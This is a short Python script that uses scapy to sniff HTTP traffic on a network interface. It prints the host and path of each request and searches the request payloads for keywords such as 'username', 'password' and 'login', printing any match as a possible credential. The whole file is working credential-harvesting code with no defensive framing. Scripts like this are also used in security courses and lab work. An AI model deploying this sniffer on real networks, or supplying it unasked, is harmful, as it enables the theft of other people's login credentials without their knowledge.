#/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface, process_packet):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def get_url(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP Request Host >> " + str(packet[http.HTTPRequest].Host))
        print("[+] HTTP Request Path >> " + str(packet[http.HTTPRequest].Path))
    else:
        print("[-] No HTTP Request detected.")

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "password", "login", "pass"]
        for keyword in keywords:
            if keyword in load:
                print("[+] Possible username/password >> " +load)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        get_url(packet)
        get_login_info(packet)